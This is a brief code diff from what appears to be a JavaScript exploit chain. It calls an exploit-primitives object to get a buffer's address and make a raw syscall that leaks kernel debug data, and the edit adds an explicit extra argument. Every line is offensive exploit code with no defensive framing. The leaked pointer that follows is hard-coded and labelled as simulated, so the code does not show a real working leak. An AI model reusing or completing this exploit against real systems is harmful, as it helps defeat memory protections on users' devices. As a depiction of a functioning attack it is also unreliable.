@@ -32,7 +32,9 @@
             let leak_diagnostic_buffer = new Uint32Array(0x40);
             let leak_buffer_addr = window.exploitPrimitives.getAddr(leak_diagnostic_buffer);
 
-            await window.exploitPrimitives.syscall(SYS_GET_AIO_DEBUG_INFO, leak_buffer_addr, NUM_REQUESTS);
+            // FIX: Explicitly supply a third argument (0) instead of leaving it blank to eliminate 'undefined'
+            let placeholder_arg3 = 0;
+            await window.exploitPrimitives.syscall(SYS_GET_AIO_DEBUG_INFO, leak_buffer_addr, NUM_REQUESTS, placeholder_arg3);
             
             // Simulating parsing out the dword leak at +0x20 and the userland pointers documented in notes
             let leaked_low = 0x805c0210; // Emulated base function resolution offset
